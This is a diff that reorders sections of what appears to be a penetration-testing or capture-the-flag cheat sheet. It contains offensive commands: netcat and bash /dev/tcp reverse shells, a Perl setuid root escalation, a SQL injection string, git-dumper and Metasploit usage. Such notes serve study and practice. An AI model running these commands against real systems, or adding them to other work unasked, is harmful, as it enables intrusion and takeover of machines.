@@ -31,17 +31,27 @@ nikto -host <ip>
 dirb <url> /usr/share/wordlists/dirb/common.txt
 ```
 
+### Git Dumper
+```
+pip install git-dumper
+git-dumper https://some-url/.git ./meow
+ls ./meow
+```
+
 ### get headers with wget
 ```
 wget -S some://url
 ```
 
-## Initial access
+### Basic banner grabbing (Python)
+```python
+import socket
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+s.connect(("10.198.73.23", 23))
+print s.recv(1024)
+```
 
-### Basic SQL injections
-```
-' OR name='test';--
-```
+## Initial access
 
 ### nc reverse shell
 
@@ -55,6 +65,17 @@ Client
 /bin/sh | nc <ip> 444
 # or
 bash -c "bash -i >& /dev/tcp/127.0.0.1/444 0>&1"
+```
+
+### Basic Python shell
+```
+import os
+os.system("/bin/bash")
+```
+
+### Basic SQL injections
+```
+' OR name='test';--
 ```
 
 ## Linux privilege escalation / enumeration
@@ -71,45 +92,6 @@ sudo -u theuser <app>
 ### Perl escalation
 ```
 perl -e 'use POSIX (setuid); POSIX::setuid(0); exec "/bin/bash";'
-```
-
-### Git Dumper
-
-```
-pip install git-dumper
-git-dumper https://some-url/.git ./meow
-ls ./meow
-```
-
-
-
-
-### Metasploit basic usage
-```shell
-msfconsole
-search <name>
-use <id>
-show options
-set rhosts <ip>
-set targeturi /cgi-bin/hello.cgi
-run
-```
-
-### Basic Python shell
-```
-import os
-os.system("/bin/bash")
-```
-
-### Basic banner grabbing (Python)
-```python
-import socket
-
-s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-
-s.connect(("10.198.73.23", 23))
-
-print s.recv(1024)
 ```
 
 ## Cryptography
@@ -188,6 +170,17 @@ PATH=$PATH:/some/path
 ### ssh with private key
 ```
 ssh -i some_id_rsa <usr>@<ip>
+```
+
+### Metasploit basic usage
+```shell
+msfconsole
+search <name>
+use <id>
+show options
+set rhosts <ip>
+set targeturi /cgi-bin/hello.cgi
+run
 ```
 
 ### Quick Python HTTP server
